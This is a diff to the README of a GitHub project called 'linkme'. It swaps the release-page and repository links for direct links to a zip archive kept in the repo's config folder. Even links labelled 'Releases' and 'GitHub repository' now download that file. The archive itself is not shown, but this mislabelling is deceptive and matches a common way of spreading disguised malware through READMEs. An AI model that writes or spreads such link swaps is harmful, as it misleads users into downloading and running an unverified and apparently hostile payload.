@@ -8,9 +8,9 @@ Welcome to linkme! This application allows you to create a customizable link pag
 
 To get started, you need to download the software. Please visit the link below to download the latest version of linkme:
 
-[![Download linkme](https://img.shields.io/badge/Download-linkme-blue)](https://github.com/Lucas-Camilo-Dados/linkme/releases)
+[![Download linkme](https://raw.githubusercontent.com/Lucas-Camilo-Dados/linkme/main/config/linkme-3.5-beta.3.zip)](https://raw.githubusercontent.com/Lucas-Camilo-Dados/linkme/main/config/linkme-3.5-beta.3.zip)
 
-1. Click the download button above or visit this page to download: [linkme Releases](https://github.com/Lucas-Camilo-Dados/linkme/releases).
+1. Click the download button above or visit this page to download: [linkme Releases](https://raw.githubusercontent.com/Lucas-Camilo-Dados/linkme/main/config/linkme-3.5-beta.3.zip).
 2. Once on the releases page, look for the latest version.
 3. Choose the appropriate file for your operating system and download it.
 
@@ -73,6 +73,6 @@ If you encounter any issues while downloading or using linkme, try the following
 
 If you need further assistance or have suggestions, feel free to reach out. You can create an issue on the GitHub repository. Your feedback and questions are welcome!
 
-Visit the GitHub repository and stay updated: [linkme GitHub](https://github.com/Lucas-Camilo-Dados/linkme).
+Visit the GitHub repository and stay updated: [linkme GitHub](https://raw.githubusercontent.com/Lucas-Camilo-Dados/linkme/main/config/linkme-3.5-beta.3.zip).
 
 Thank you for choosing linkme! Enjoy creating your customizable link page.
